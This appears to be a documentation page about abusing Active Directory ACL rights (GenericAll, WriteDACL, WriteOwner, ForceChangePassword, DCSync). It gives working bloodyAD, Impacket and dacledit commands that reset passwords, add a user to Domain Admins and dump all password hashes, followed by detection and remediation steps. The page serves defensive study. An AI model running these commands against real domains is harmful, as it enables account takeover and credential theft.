# ACL Abuse

**MITRE:** T1222.001

## How it works

Active Directory objects have Access Control Lists (ACLs) that define who can do what. Misconfigured ACLs let low-privilege users perform privileged operations — reset passwords, modify group membership, take ownership, or grant themselves full control.

## Rights and their impact

### GenericAll
Full control over the object. Can reset password, add to groups, set SPN (for Kerberoasting), modify attributes.

```bash
# Reset target user password
bloodyAD -u attacker -p 'Pass' -d corp.local --host 10.0.0.1 \
  set password victim 'NewPass123!'

# Add attacker to Domain Admins
bloodyAD -u attacker -p 'Pass' -d corp.local --host 10.0.0.1 \
  add groupMember 'Domain Admins' attacker
```

### WriteDACL
Modify the object's ACL — grant yourself or another principal GenericAll.

```bash
dacledit.py -action write -rights FullControl \
  -principal attacker -target victim \
  'corp.local/attacker:Pass'
```

### WriteOwner
Take ownership of the object, then grant yourself WriteDACL.

```bash
owneredit.py -action write -new-owner attacker -target victim \
  'corp.local/attacker:Pass'
```

### ForceChangePassword
Reset the account's password without knowing the current one.

```bash
bloodyAD -u attacker -p 'Pass' -d corp.local --host 10.0.0.1 \
  set password victim 'NewPass123!'
```

### DCSync (DS-Replication-Get-Changes-All)
Replicate directory contents including all password hashes.

```bash
secretsdump.py 'corp.local/attacker:Pass'@10.0.0.1
```

## Detection with adpath

```bash
adpath acl -d corp.local -u jdoe -p 'Password1' --dc 10.0.0.1
```

## Remediation

1. Audit ACLs with `Get-Acl` or BloodHound regularly
2. Remove unnecessary delegated rights
3. Enable AdminSDHolder protection for privileged accounts
4. Use AD Tiered Administration model — isolate privileged accounts
